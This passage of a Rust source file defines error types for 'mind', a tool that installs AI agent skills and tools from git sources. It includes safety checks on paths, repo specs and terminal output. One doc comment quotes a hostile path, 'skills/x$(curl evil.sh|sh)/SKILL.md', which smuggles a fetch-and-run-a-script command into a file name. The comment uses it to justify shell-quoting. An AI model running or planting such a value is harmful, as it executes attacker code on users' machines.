//! Structured error types for `mind`.
//!
//! Every fallible operation returns [`Result<T>`], which carries a [`MindError`].
//! We deliberately avoid stringly-typed errors (e.g. `anyhow`) so callers and
//! tests can match on the precise failure and so messages stay consistent.

use std::path::{Path, PathBuf};
use std::process::ExitStatus;

/// The crate-wide result type.
pub type Result<T> = std::result::Result<T, MindError>;

/// Size cap for a source-controlled metadata file read during discovery: a
/// `mind.toml`, an item's frontmatter block (`SKILL.md`/agent/rule `.md`), or a
/// Claude plugin/marketplace manifest (`.claude-plugin/plugin.json` /
/// `marketplace.json`). DSC-91.
///
/// These are hand-authored text files a maintainer edits directly; the largest
/// legitimate one in this repo's own examples is a few KB. 8 MiB is chosen as a
/// generous ceiling that sits orders of magnitude above any real metadata file
/// while still bounding how much memory a single melded source can force `mind`
/// to allocate while scanning or installing it. This cap covers metadata reads
/// ONLY -- item content (an item tree's `{{ns:}}` expansion at install, the
/// unguarded-reference scan, `review`, the TUI preview, and content hashing)
/// stays uncapped (see spec/discovery.md DSC-90).
pub const METADATA_SIZE_LIMIT: u64 = 8 * 1024 * 1024;

/// Read `path` into a `String`, refusing (with [`MindError::MetadataTooLarge`])
/// a file at or above [`METADATA_SIZE_LIMIT`] bytes -- WITHOUT first allocating
/// the whole file. Reads at most `METADATA_SIZE_LIMIT + 1` bytes via
/// `Read::take`, so an oversized file's cost is bounded by the cap, not by its
/// actual size.
///
/// Shared by every metadata reader (`mindfile.rs`, `frontmatter.rs`,
/// `plugin_manifest.rs`) so the limit and the error are defined exactly once.
/// A non-UTF-8 file surfaces as a plain [`MindError::Io`] (matching
/// `std::fs::read_to_string`'s behavior); other I/O failures (e.g. not found)
/// also surface as `MindError::Io`, leaving the caller to decide how to treat
/// them (several metadata readers treat a NotFound source as "absent", not an
/// error).
pub fn read_capped_metadata(path: &Path) -> Result<String> {
    use std::io::Read as _;

    let file = std::fs::File::open(path).map_err(|e| MindError::io(path, e))?;
    let mut buf = Vec::new();
    file.take(METADATA_SIZE_LIMIT + 1)
        .read_to_end(&mut buf)
        .map_err(|e| MindError::io(path, e))?;
    if buf.len() as u64 > METADATA_SIZE_LIMIT {
        return Err(MindError::MetadataTooLarge {
            path: path.to_path_buf(),
            limit: METADATA_SIZE_LIMIT,
        });
    }
    String::from_utf8(buf).map_err(|e| {
        MindError::io(
            path,
            std::io::Error::new(std::io::ErrorKind::InvalidData, e),
        )
    })
}

/// The item kinds `mind` knows how to install.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, PartialOrd, Ord)]
pub enum ItemKind {
    Skill,
    Agent,
    Rule,
    /// Helper tooling (scripts or a compiled binary) other items reference. A
    /// tool installs to the store but is not linked into an agent home by
    /// default: the harness does not discover it; items reach it by path token.
    Tool,
}

impl ItemKind {
    pub fn as_str(self) -> &'static str {
        match self {
            ItemKind::Skill => "skill",
            ItemKind::Agent => "agent",
            ItemKind::Rule => "rule",
            ItemKind::Tool => "tool",
        }
    }

    /// Parse a kind from its lowercase string form.
    pub fn parse(s: &str) -> Option<Self> {
        match s {
            "skill" => Some(ItemKind::Skill),
            "agent" => Some(ItemKind::Agent),
            "rule" => Some(ItemKind::Rule),
            "tool" => Some(ItemKind::Tool),
            _ => None,
        }
    }

    /// The plural directory name for this kind, used by the source-repo
    /// convention layout, the `~/.claude` link layout, and `~/.mind/store`
    /// (`skills`/`agents`/`rules`/`tools`). The single source of truth for the
    /// kind-to-directory mapping; `from_dir` is its inverse.
    pub fn dir(self) -> &'static str {
        match self {
            ItemKind::Skill => "skills",
            ItemKind::Agent => "agents",
            ItemKind::Rule => "rules",
            ItemKind::Tool => "tools",
        }
    }

    /// The kind for a plural directory name, the inverse of [`dir`](Self::dir).
    pub fn from_dir(s: &str) -> Option<Self> {
        match s {
            "skills" => Some(ItemKind::Skill),
            "agents" => Some(ItemKind::Agent),
            "rules" => Some(ItemKind::Rule),
            "tools" => Some(ItemKind::Tool),
            _ => None,
        }
    }

    /// The kinds linked into an agent home: every kind except `Tool`, which is
    /// store-only and reached by reference (tooling.md TOOL-3). Also the "all
    /// kinds" default for a lobe with no `kinds` filter (HARN-1).
    pub const LINKABLE: [ItemKind; 3] = [ItemKind::Skill, ItemKind::Agent, ItemKind::Rule];

    /// Parse a list of kind strings into [`ItemKind`]s, rejecting any unknown
    /// string with [`MindError::UnknownKind`]. Used by the config `kinds` filter
    /// (HARN-1) and the harness presets (HARN-4).
    pub fn parse_kinds(strs: &[String]) -> Result<Vec<ItemKind>> {
        strs.iter()
            .map(|s| ItemKind::parse(s).ok_or_else(|| MindError::UnknownKind { kind: s.clone() }))
            .collect()
    }
}

impl std::fmt::Display for ItemKind {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(self.as_str())
    }
}

/// Why a path-reference token or `requires` entry failed to resolve, so a
/// [`MindError::BadReference`] (and the `review` `bad-reference` finding) can name
/// the specific cause instead of one blanket message. The causes read very
/// differently to a maintainer -- a genuine typo/miss, a real tool whose
/// entrypoint just did not ship, a name that is ambiguous across kinds, a
/// forbidden cross-source ref, or a malformed ref -- and conflating them sends a
/// debugging session down the wrong trail (tooling.md TOOL-17/TOOL-18,
/// dependencies.md DEP-7).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum BadRefReason {
    /// The referent names no matching sibling item (a plain miss).
    NoMatch,
    /// A `{{tools:name}}` referent names a real sibling tool, but that tool has
    /// no resolvable entrypoint (`bin`): no `TOOL.md`/`mind.toml` `bin` and no
    /// convention entrypoint file present in the source (tooling.md TOOL-5).
    ToolNoBin,
    /// The referent (a bare `{{path:name}}` or a bare `requires` name) matches
    /// more than one sibling across kinds and carries no `kind:` qualifier to
    /// disambiguate (tooling.md TOOL-18, dependencies.md DEP-7).
    AmbiguousKind,
    /// A `requires` entry is source-qualified (`owner/repo#name`); `requires` is
    /// intra-source only and never crosses sources (dependencies.md DEP-5/DEP-7).
    CrossSource,
    /// A `requires` entry is not a parseable item ref at all (dependencies.md
    /// DEP-7).
    InvalidRef,
}

impl std::fmt::Display for BadRefReason {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            BadRefReason::NoMatch => f.write_str("does not match any item"),
            BadRefReason::ToolNoBin => {
                f.write_str("names a tool with no resolvable entrypoint (bin)")
            }
            BadRefReason::AmbiguousKind => {
                f.write_str("is ambiguous across kinds; add a kind qualifier")
            }
            BadRefReason::CrossSource => {
                f.write_str("crosses sources; a requires entry is intra-source only")
            }
            BadRefReason::InvalidRef => f.write_str("is not a valid item ref"),
        }
    }
}

/// Format a conflicts list for display in error messages.
///
/// Each tuple is `(kind, effective_name, existing_source)`. Used by the
/// [`MindError::SkillCollision`] `#[error(...)]` format string.
fn format_conflicts(conflicts: &[(String, String, String)]) -> String {
    conflicts
        .iter()
        .map(|(k, n, s)| format!("  {k}:{n} (already installed from '{s}')"))
        .collect::<Vec<_>>()
        .join("\n")
}

/// All the ways a `mind` operation can fail.
#[derive(Debug, thiserror::Error)]
pub enum MindError {
    #[error("could not locate the home directory")]
    HomeDirNotFound,

    #[error("I/O error at '{path}': {source}")]
    Io {
        path: PathBuf,
        #[source]
        source: std::io::Error,
    },

    #[error("failed to (de)serialize {what}: {source}")]
    Json {
        what: String,
        #[source]
        source: serde_json::Error,
    },

    #[error("invalid mind.toml at {path}: {source}")]
    Toml {
        path: PathBuf,
        #[source]
        source: toml::de::Error,
    },

    #[error("invalid config at {path}: {msg}")]
    ConfigToml { path: PathBuf, msg: String },

    #[error("failed to write {path}: {source}")]
    TomlWrite {
        path: PathBuf,
        #[source]
        source: toml::ser::Error,
    },

    // Names the next command, mirroring `ItemNotFound`'s house style (CLI-179).
    #[error(
        "'{path}' is not a configured agent home (lobe); run `mind config lobes list` to see configured lobes"
    )]
    UnknownLobe { path: String },

    #[error("'{kind}' is not a valid item kind (expected one of: skill, agent, rule, tool)")]
    UnknownKind { kind: String },

    #[error(
        "'{name}' is not a known lobe preset (expected one of: gemini, codex, universal, windsurf)"
    )]
    UnknownPreset { name: String },

    #[error("`config lobes add` needs a path or `--preset <name>`")]
    LobeTargetRequired,

    /// A path could not be created because one of its components is a symlink
    /// whose target does not exist. `create_dir_all` reports this as a bare
    /// `File exists` (the link itself exists), which does not point at the real
    /// cause, so name the broken link and its target instead.
    #[error(
        "cannot create {path}: '{link}' is a symlink pointing at '{target}', which does not exist; \
         fix or remove the broken link (if it is a configured agent home, see `mind config lobes list`)"
    )]
    BrokenSymlinkPath {
        path: PathBuf,
        link: PathBuf,
        target: PathBuf,
    },

    #[error("mind.toml at {path}: {msg}")]
    MindToml { path: PathBuf, msg: String },

    /// A non-`mind.toml` source manifest (a Claude `plugin.json` /
    /// `marketplace.json`) that is malformed or schema-invalid. Kept distinct from
    /// [`MindError::MindToml`] so the message names the actual file rather than
    /// mislabeling a JSON manifest as "mind.toml at ..."; `{path}` and the caller's
    /// `{msg}` (which already names the file kind) carry the specifics.
    #[error("{path}: {msg}")]
    Manifest { path: PathBuf, msg: String },

    /// DSC-91: a hand-authored source-controlled metadata file (`mind.toml`, an
    /// item's frontmatter block, or a Claude plugin/marketplace manifest)
    /// exceeded [`METADATA_SIZE_LIMIT`]. Refused before the whole file is read
    /// into memory (see [`read_capped_metadata`]).
    #[error(
        "'{path}' exceeds the {} MiB size cap for a hand-authored metadata file (mind.toml, an \
         item's frontmatter, or a plugin/marketplace manifest); trim the file, or move large \
         content out of it, and try again",
        limit / (1024 * 1024)
    )]
    MetadataTooLarge { path: PathBuf, limit: u64 },

    /// CLI-215: this message previously omitted the local-path forms
    /// `parse_spec` has always accepted (a bare `/abs/path`, `./rel/path`,
    /// `../rel/path`, or `file:///abs/path`), even though `mind review --help`
    /// documents them as a valid `<target>`. Naming them here closes that gap.
    #[error(
        "'{spec}' is not a valid repo spec (expected 'owner/repo', a github shorthand, a git URL, \
         or a local path: '/abs/path', './rel/path', '../rel/path', or 'file:///abs/path')"
    )]
    InvalidRepoSpec { spec: String },

    /// CLI-204: a repo spec that parses structurally but whose `host`, `owner`,
    /// or `repo` part is not a single safe path component. Those three parts are
    /// both the source's identity segments and its clone-path components, so a
    /// part carrying `/`, `..`, or a control character would break identity
    /// segmentation (and therefore allowlist matching, POL-67) and escape the
    /// sources tree. Kept distinct from [`MindError::InvalidRepoSpec`] so the
    /// message names the offending part rather than the whole spec.
    #[error(
        "'{spec}' is not a usable repo spec: its {part} part '{value}' {reason}; each of host, owner, and repo must be a single path component"
    )]
    UnsafeRepoSpec {
        spec: String,
        part: &'static str,
        value: String,
        reason: &'static str,
    },

    /// LNK-1/LNK-2: a URL that carries a `tree`/`blob` link marker (so it is
    /// unambiguously an attempted item link, not a plain repo spec) but whose
    /// tail fails to parse as one. Kept distinct from [`MindError::InvalidRepoSpec`]
    /// so the message names the two link shapes instead of telling a user who
    /// pasted a real forge URL that it is not a valid URL at all (`reason`
    /// carries the specific defect: missing ref, missing skill path, a `blob`
    /// link not ending in `/SKILL.md`, or an unsafe path/ref value).
    #[error(
        "'{url}' is not a valid item-link URL ({reason}); expected '<repo-url>/tree/<ref>/<skill-dir>' or '<repo-url>/blob/<ref>/<skill-dir>/SKILL.md' (GitLab's '/-/tree/' and '/-/blob/' forms also work)"
    )]
    BadItemLink { url: String, reason: String },

    #[error(
        "'{name}' is not a valid item ref (expected 'name', 'skill:name', 'agent:name', 'rule:name', or 'owner/repo#name')"
    )]
    InvalidItemRef { name: String },

    #[error(
        "'{prefix}' cannot be used as a namespace prefix: it is a reserved item-kind word (skill, agent, rule, tool), which would make a prefixed name indistinguishable from a kind-qualified ref"
    )]
    ReservedPrefix { prefix: String },

    /// NS-28/NS-72: prefix contains a path-unsafe character or structure. A
    /// melded repo's `[source].prefix` reaches this variant, so the offending
    /// value is sanitized before display (`unsafe_prefix_message`) rather than
    /// interpolated raw: otherwise a hostile source's rejected prefix (e.g. one
    /// carrying a bidi override) would still write its raw payload to the
    /// terminal via the rejection message itself.
    #[error("{}", unsafe_prefix_message(prefix))]
    UnsafePrefix { prefix: String },

    #[error(
        "cannot change the namespace of source '{src_name}': the following items are installed ({items}); run `mind forget <item>` for each before changing the namespace",
        items = items.join(", ")
    )]
    NamespaceLocked {
        src_name: String,
        items: Vec<String>,
    },

    #[error("source '{name}' is already melded (from {url})")]
    SourceExists { name: String, url: String },

    /// Names the next command, mirroring `ItemNotFound`'s house style
    /// (CLI-179). Reachable both from an exact-name source lookup and from a
    /// glob selector (`mind sync 'acme/*'`) that matched nothing. The old
    /// wording ("no source named '{name}' is melded") asserted something was
    /// literally *named* the given string, which is false for a selector and
    /// invites the reader to conclude glob selectors are not supported rather
    /// than that the pattern matched nothing. "no melded source matches"
    /// covers both readings without lying about either: an exact name that is
    /// melded trivially "matches" itself, and a selector that matched nothing
    /// is described accurately.
    #[error(
        "no melded source matches '{name}'; run `mind recall --sources` to list melded sources"
    )]
    SourceNotFound { name: String },

    #[error("'{pattern}' is not a valid glob selector: {source}")]
    InvalidPattern {
        pattern: String,
        #[source]
        source: glob::PatternError,
    },

    #[error("'{query}' matches multiple sources: {}; use the full owner/repo", candidates.join(", "))]
    AmbiguousSource {
        query: String,
        candidates: Vec<String>,
    },

    // spec: CLI-179
    #[error("{}", item_not_found_message(query, *sources))]
    ItemNotFound { query: String, sources: usize },

    #[error("'{query}' is ambiguous; matches: {}", candidates.join(", "))]
    AmbiguousItem {
        query: String,
        candidates: Vec<String>,
    },

    /// LIFE-46: an `upgrade` rename would collide at its target key, either
    /// with a DIFFERENT item that already occupies that key in the manifest,
    /// or with another pending rename in the same upgrade batch that
    /// converges on the same key. Distinct from [`MindError::AmbiguousItem`]:
    /// that variant renders as a "query" with a candidate list, which reads as
    /// something the user typed and searched for -- not as a conflict `mind
    /// upgrade` (no query involved) discovered on its own -- and it carries no
    /// remedy. This variant instead names the two colliding occupants plainly
    /// and states both real remedies: forget the item occupying `key`, or
    /// re-namespace the incoming source so its effective name no longer
    /// collides. See [`upgrade_rename_collision_message`] for the CLI-225
    /// shell-quoting this message applies to `key` inside the runnable
    /// `mind forget` remedy.
    #[error(
        "{}",
        upgrade_rename_collision_message(key, existing_source, incoming, incoming_source)
    )]
    UpgradeRenameCollision {
        /// The colliding target key (`kind:name`, `InstalledItem::key` form).
        key: String,
        /// The source of the item currently occupying `key` (either a
        /// pre-existing manifest entry, or the first pending rename in the
        /// same batch to claim it).
        existing_source: String,
        /// The (pre-rename) key of the item whose rename would also target
        /// `key`.
        incoming: String,
        /// The source of the incoming (renaming) item.
        incoming_source: String,
    },

    /// DSC-95 sanitizes the *display* of an installed name while keeping the
    /// raw name as identity, so `recall` can show `skill:review` (sanitized)
    /// while `forget skill:review` (the sanitized text, typed back) fails with
    /// "not installed" -- an unfalsifiable-looking contradiction unless the
    /// message itself explains why. See `not_installed_message`.
    #[error("{}", not_installed_message(name))]
    NotInstalled { name: String },

    #[error("sync failed for {failed} of {total} source(s); see the messages above")]
    SyncFailed { failed: usize, total: usize },

    #[error(
        "source '{source_name}' requires mind >= {required}, but this is mind {running}; run `mind evolve`"
    )]
    IncompatibleVersion {
        source_name: String,
        required: String,
        running: String,
    },

    #[error(
        "'{path}' already exists and is not managed by mind; remove it (or `mind forget` the item) before installing, or re-run with `--force` to overwrite"
    )]
    LinkOccupied { path: String },

    #[error("{item}: reference {referent} {reason} in source '{in_source}'")]
    BadReference {
        item: String,
        /// The offending token as written, e.g. `{{ns:foo}}` or `{{tools:bar}}`.
        referent: String,
        /// Why it did not resolve, so the message names the specific cause
        /// (TOOL-17). A `NoMatch` keeps the historical "does not match any item"
        /// wording.
        reason: BadRefReason,
        in_source: String,
    },

    #[error("git {} failed for {url}{}: {}",
        args.join(" "),
        status_suffix(*status),
        if stderr.is_empty() { "<no stderr>" } else { stderr })]
    Git {
        url: String,
        args: Vec<String>,
        status: Option<ExitStatus>,
        stderr: String,
    },

    // `source` is reserved by thiserror (it auto-treats a field named `source` as
    // the error source, which must impl `Error`); use `super_source` instead.
    #[error(
        "melding '{super_source}' produced no discoverable items: it has no items of its own and every nested source failed to register"
    )]
    CuratorAllNestedFailed { super_source: String },

    #[error("git executable not found on PATH; install git to meld and sync sources")]
    GitNotFound,

    #[error("conflicting pin flags: {first} and {second} cannot both be given; supply at most one")]
    ConflictingPin { first: String, second: String },

    #[error(
        "invalid --pin value '{value}': expected HEAD, a ref (tag/sha/branch), 'branch=<name>', or 'tag=<name>'"
    )]
    BadPinSpec { value: String },

    /// DSC-95: `source_name` and `root` are both source-controlled (a
    /// `mind.toml` `[discover]` root, or the source's own identity), and
    /// `main.rs` prints this message verbatim via `eprintln!("error: {err}")`,
    /// so a hostile repo could otherwise write attacker escape bytes to the
    /// terminal through its own rejection. Sanitized via
    /// `invalid_root_message`, the same pattern `unsafe_name_message` uses.
    #[error("{}", invalid_root_message(source_name, root))]
    InvalidRoot { source_name: String, root: String },

    #[error(
        "source '{source_name}': linked path '{path}' is not a skill directory in the clone (no SKILL.md)"
    )]
    LinkNotASkill { source_name: String, path: String },

    /// LNK-18: an item-link instance's catalog is exactly the linked skill
    /// (LNK-7), so a `{{ns:name}}` token naming a sibling can never resolve, no
    /// matter how the repo is laid out. This variant is not limited to that
    /// token: it is also raised for a `{{tools:name}}` or `{{path:kind:name}}`
    /// token naming a sibling, since a single-skill link has no siblings for
    /// either to reach. A token must be rewritten into the item body (NS-10),
    /// so unlike a `requires` entry it cannot be left dangling: this is a hard
    /// error that names the one-command remedy.
    ///
    /// DSC-95: `item`, `referent`, and `in_source` are all source-controlled
    /// and interpolated verbatim, so each is sanitized at the call site;
    /// `remedy` is composed there from a shell-quoted, sanitized URL and item
    /// name.
    #[error(
        "{item}: reference {referent} names a sibling, but source '{in_source}' is a single-skill item link with no siblings; meld the whole repo and install just this skill: `{remedy}`"
    )]
    LinkRefUnsatisfiable {
        item: String,
        referent: String,
        in_source: String,
        remedy: String,
    },

    /// IGN-4: an `ignore` entry that is not usable as a pattern (empty,
    /// absolute, `~`-rooted, escaping via `..`, NUL-carrying, or a malformed
    /// glob). A hard error rather than a silently inert entry: an entry that
    /// never matches reads at a glance exactly like one that does, so the
    /// author would believe files are excluded that are being installed and
    /// hashed.
    ///
    /// DSC-95: `item` and `entry` are source-controlled (`mind.toml` text), so
    /// both are sanitized at the construction site.
    #[error("{item}: invalid ignore pattern '{entry}': {reason}")]
    BadIgnorePattern {
        item: String,
        entry: String,
        reason: String,
    },

    /// IGN-5: an `ignore` entry that would exclude the item's own anchor file
    /// (`SKILL.md`, `TOOL.md`, or the single file that IS an agent/rule item).
    /// Without this an item could be declared and then install as an empty
    /// directory, which discovery still offers and the harness cannot use.
    #[error(
        "{item}: ignore pattern '{entry}' would exclude the item's own {anchor}; an item cannot ignore the file that defines it"
    )]
    IgnoresOwnAnchor {
        item: String,
        entry: String,
        anchor: String,
    },

    /// IGN-12: a file listed in `expand:` (NS-57) that the ignore set removes
    /// from the item. The two directives contradict: `expand:` asks for token
    /// expansion in a file `ignore` says is not part of the item. An authoring
    /// mistake, so it names both rather than resolving silently by precedence.
    #[error(
        "{item}: '{file}' is listed in `expand:` but is excluded by the ignore pattern '{entry}'; a file cannot be both expanded and ignored"
    )]
    ExpandsIgnoredFile {
        item: String,
        file: String,
        entry: String,
    },

    /// CLI-236: a `meld --learn <GLOB>` value that is not usable as a pattern
    /// at all (empty, source-qualified, malformed as a ref, or a malformed
    /// glob). `reason` is a short clause naming which, so the four cases are
    /// not collapsed into one blunt "invalid ref" that describes forms the flag
    /// does not even accept.
    #[error("invalid --learn pattern '{pattern}': {reason}")]
    InvalidLearnPattern { pattern: String, reason: String },

    /// CLI-236: a `--learn` pattern that parses but matches no item in the
    /// source being melded. Distinct from the generic `ItemNotFound`, whose
    /// message reports a search across every melded source: this search was
    /// scoped to one source, and the two things that most often explain a miss
    /// (an inventory that does not declare the item, and a super-source whose
    /// nested sources register separately) are specific to that scope. Points
    /// at `mind probe --source <name> --no-tui`, not `recall`: `recall` lists
    /// what is INSTALLED, and after a no-match nothing from this source is
    /// installed, so it would answer with an empty listing that contradicts
    /// the message's own claim of what it lists.
    ///
    /// DSC-95/CLI-225: `source_name` is source-controlled (an item-link
    /// identity embeds a repo-controlled path, `host/owner/repo#<item_path>`,
    /// and `item_path` is validated only against traversal, not shell
    /// metacharacters), so it is sanitized with `strip_ansi` and, for the
    /// occurrence inside the backticked `mind probe` command, also
    /// `shell_quote`d before composition -- the same pattern
    /// `hooks_not_run_message`/`ambiguous_hook_target_message` use. Without
    /// quoting, a repo shipping e.g. `skills/x$(curl evil.sh|sh)/SKILL.md`
    /// could make this message's own suggested remedy execute an attacker
    /// command when pasted. `pattern` is prose only (never placed inside a
    /// command here) but is sanitized too, defensively. The `--add-root`
    /// caveat notes it only takes effect at the meld that first registers the
    /// source (L4): after a `--learn` miss the source is already registered,
    /// so the flag is silently ignored unless the caller unmelds first.
    // `source` is reserved by thiserror (see the note on CuratorAllNestedFailed),
    // so the source's name rides as `source_name` here too.
    #[error("{}", learn_no_match_message(pattern, source_name))]
    LearnPatternNoMatch {
        pattern: String,
        source_name: String,
    },

    /// DSC-95: `source_name` and `name` are both source-controlled (the
    /// source's own identity and an item name discovered under one of its scan
    /// roots), and `main.rs` prints this message verbatim via
    /// `eprintln!("error: {err}")`, so a hostile repo could otherwise write
    /// attacker escape bytes to the terminal through its own rejection.
    /// Sanitized via `duplicate_item_message`, the same pattern
    /// `unsafe_name_message` uses.
    #[error("{}", duplicate_item_message(source_name, *kind, name))]
    DuplicateItem {
        source_name: String,
        kind: ItemKind,
        name: String,
    },

    #[error("review found {hard} hard error(s); see the findings above")]
    ReviewFailed { hard: usize },

    // Constructed by the policy-enforcement paths (meld/sync/upgrade gating).
    #[error("source '{identity}' is not permitted by the managed policy's allowlist")]
    SourceNotAllowed { identity: String },

    #[error(
        "local-path and file:// melds are forbidden by the managed policy \
         ([sources].allow-local = false)"
    )]
    LocalMeldForbidden { identity: String },

    #[error(
        "source '{identity}' must be pinned to a tag or ref: the managed policy forbids floating branches"
    )]
    UnpinnedSourceForbidden { identity: String },

    #[error("invalid managed policy at {path}: {reason}")]
    InvalidPolicy { path: String, reason: String },

    #[error(
        "the agent homes are locked by the managed policy ([lobes].lock); `config lobes {action}` is refused"
    )]
    LobesLocked { action: String },

    #[error(
        "install hook for source '{identity}' failed{}: {}\n  command: {command}",
        status_suffix(*status),
        if *streamed {
            // spec: HOOK-30 -- the hook's streams are inherited, so mind never
            // saw a byte of them and cannot tell a silent hook from a talkative
            // one. The message therefore does not assert that output exists: it
            // says where output WOULD be. Claiming "its output, if any, is in the frame above" over an
            // empty frame, or "(no output)" over a screen of build errors, would
            // each be wrong half the time.
            "its output, if any, is in the frame above"
        } else if stderr.is_empty() {
            "(no output)"
        } else {
            stderr.as_str()
        }
    )]
    HookFailed {
        identity: String,
        command: String,
        status: Option<ExitStatus>,
        /// The failure's own reason, for a hook that never ran (a spawn error).
        /// Empty for a hook that ran, whose output went straight to the terminal
        /// and was never captured.
        stderr: String,
        /// True when the hook actually ran, so its output (if it produced any)
        /// was streamed live inside the frame. False only when the spawn itself
        /// failed, where `stderr` carries the reason instead.
        streamed: bool,
    },

    #[error("no prebuilt `mind` binary for this platform ({os}/{arch}); build from source instead")]
    UnsupportedPlatform { os: String, arch: String },

    #[error("failed to download {url}: {reason}")]
    DownloadFailed { url: String, reason: String },

    #[error("the downloaded release archive did not contain a 'mind' binary")]
    ReleaseAssetEmpty,

    #[error(
        "cannot replace the running binary at {path}: it is not writable; reinstall with elevated privileges (e.g. sudo) or, for a Homebrew install, run `brew upgrade mind`"
    )]
    TargetNotWritable { path: String },

    #[error("'{path}' is not a directory")]
    NotADirectory { path: String },

    #[error("{action} needs confirmation; re-run with --yes (or in an interactive terminal)")]
    ConfirmationRequired { action: String },

    /// ABS-5: the destination path exists but is not a git repository.
    #[error(
        "'{path}' is not a git repository; absorb requires a git destination (use --to to choose one)"
    )]
    DestinationNotRepo { path: String },

    /// DSC-66: a pin/ref value that would be misinterpreted as a git option was
    /// rejected at parse time before it could reach a git subprocess.
    #[error("invalid ref value '{value}': {reason}")]
    InvalidRef { value: String, reason: String },

    /// ABS-6: the destination already contains an item at the convention path.
    #[error("destination already has {kind}:{name} at {dest_path}; use --force to overwrite")]
    AbsorbCollision {
        kind: String,
        name: String,
        dest_path: String,
    },

    /// NS-41: two agents from different sources share the same harness name and
    /// would overwrite each other's agent-home link.
    #[error("{}", agent_collision_message(name, existing, incoming))]
    AgentCollision {
        /// The bare harness name (frontmatter `name:`) that both agents share.
        name: String,
        /// The source of the already-installed agent.
        existing: String,
        /// The source of the agent being installed.
        incoming: String,
    },

    /// Cross-source skill/rule/tool name collision detected at `meld` (NS-43/NS-45).
    /// One or more incoming items share a `(kind, effective_name)` with an already-
    /// installed item from a different source, and the session is non-interactive.
    #[error("{}", skill_collision_message(conflicts, suggested))]
    SkillCollision {
        /// Each conflict: `(kind, effective_name, existing_source)`.
        conflicts: Vec<(String, String, String)>,
        /// Suggested namespace prefix (the repo name / last URL component).
        suggested: String,
    },

    /// NS-28: effective item name contains path-traversal characters. The
    /// message sanitizes the offending name (DSC-95) so the rejection itself
    /// cannot carry a terminal-injection payload.
    #[error("{}", unsafe_name_message(name))]
    UnsafeName { name: String },

    /// STO-47: downloaded archive SHA-256 does not match the published digest.
    #[error(
        "digest mismatch for {url}: expected {expected}, got {actual}; the download may be corrupted or tampered with"
    )]
    DigestMismatch {
        url: String,
        expected: String,
        actual: String,
    },

    /// STO-66: `gh attestation verify` ran and reported the downloaded release
    /// archive does not carry a valid, matching build-provenance attestation.
    /// The swap is aborted and the existing binary is left in place.
    #[error(
        "build provenance verification failed for the downloaded release archive: {reason}; \
         evolve is aborting without replacing the running binary. If this release predates \
         build-provenance attestations, install it another way (resources/install.sh or a \
         manual download) instead of `mind evolve`"
    )]
    AttestationVerificationFailed { reason: String },

    /// POL-52/POL-53: `evolve` was refused or redirected by the managed policy.
    /// The `detail` field carries the human-readable reason: "self-update is
    /// disabled by the managed policy" for the disabled case (POL-52), or the
    /// specific mismatch message for the pinned-version-conflict case (POL-53).
    #[error("{detail}")]
    SelfUpdatePolicy { detail: String },

    /// STO-77: the resolved `evolve` target version (an explicit `--to`, a
    /// managed-policy pin, or a fetched `releases/latest` tag) failed
    /// `mindfile::is_plausible_release_tag` (STO-76's URL-path-segment safety
    /// check). Deliberately a DIFFERENT variant from [`MindError::SelfUpdatePolicy`]
    /// even though both can originate from the same `evolve` call: that
    /// variant's JSON `kind` is `self-update-policy`, and a value rejected for
    /// being malformed (not a plausible version/tag shape at all) is not a
    /// managed-policy refusal -- a reader (human or a CI log parser) seeing
    /// `self-update-policy` under a bad `--to` string would wrongly conclude
    /// "my managed policy blocks self-update" rather than "the argument itself
    /// is malformed". Genuine policy conflicts -- disabled (POL-52) or a
    /// pinned-version mismatch (POL-53) -- keep `SelfUpdatePolicy`; this
    /// variant is reserved for the STO-76 shape check alone, which runs before
    /// policy evaluation even has a chance to matter for the malformed value.
    #[error(
        "self-update target version {value:?} is not a plausible release tag (e.g. \
         \"1.2.3\" or \"1.2.3-rc1\"); refusing before building the release URL"
    )]
    SelfUpdateInvalidTarget { value: String },

    /// STO-50/STO-51: state file was written by a newer mind and uses an unknown schema version.
    /// The realistic way to hit this is a locally built `mind` newer than the
    /// latest release having written the state; for that case `mind evolve`
    /// reports "up to date" and leaves the user stuck, so a second remedy
    /// clause names the actual fix (use the newer binary that wrote it).
    #[error(
        "{what} uses schema version {found} but this mind only supports up to version {supported}; run `mind evolve` to read it, or use the newer `mind` that wrote it"
    )]
    StateTooNew {
        what: &'static str,
        found: u32,
        supported: u32,
    },

    /// HOOK-103: `--event build` is valid only for an item target; a source has
    /// no build hook. Checked before running anything.
    // spec: HOOK-103 CLI-195
    #[error(
        "--event build is valid only for an item target (a source has no build hook); use <source>#<item> to target an item"
    )]
    BuildEventRequiresItemTarget,

    /// HOOK-100: a required hook was aborted by the user at the three-way prompt
    /// during `mind hooks run`. The command exits non-zero; any hooks that ran
    /// earlier in the same session are not rolled back.
    // spec: HOOK-100
    #[error("hook '{label}' was aborted by user; not running remaining hooks")]
    HookAborted { label: String },

    /// STO-56: the base directory for a project-scoped lobe does not exist.
    /// Returned by `resolve_lobe` when an explicit `base` is given but the
    /// directory is absent, so mind refuses to fabricate a path into a
    /// nonexistent project.
    // spec: STO-56
    #[error("lobe base directory does not exist: {}", path.display())]
    LobeBaseMissing { path: PathBuf },

    /// STO-69: a source's clone path (`Source::clone_dir`) resolves outside the
    /// managed sources tree, or through a `..` component -- e.g. a hand-edited
    /// or corrupted `sources.json` entry with a traversing `host`/`owner`/`repo`
    /// part. Refused before any filesystem mutation (clone or delete) is
    /// attempted at that path, so a stale/tampered registry entry cannot make
    /// `mind` write or remove content outside `~/.mind/sources`. Not raised for
    /// a linked local source (`Source::is_linked`), whose "clone dir" is the
    /// user's own working tree by design.
    // spec: STO-69
    #[error(
        "refusing to use clone path '{path}' for source '{identity}': it resolves outside the managed sources tree"
    )]
    UnsafeClonePath { path: PathBuf, identity: String },

    /// HOOK-105: a `hooks run`/`hooks list` target string exactly names both a
    /// registered source identity (an item-link instance's own `host/owner/repo#path`
    /// identity, LNK-4, when the linked skill sits at a single top-level path
    /// segment) and, under the ordinary `<source>#<item>` reading of that same
    /// string, an installed item. Resolving silently either way depends on
    /// registry state invisible to the caller, so this is reported instead of a
    /// silent pick. `item_forms` are the kind-qualified refs
    /// (`<source>#<kind>:<name>`) that unambiguously target each matching item;
    /// a `source:<target>` prefix unambiguously targets the source.
    // spec: HOOK-105 HOOK-106
    #[error("{}", ambiguous_hook_target_message(target, item_forms))]
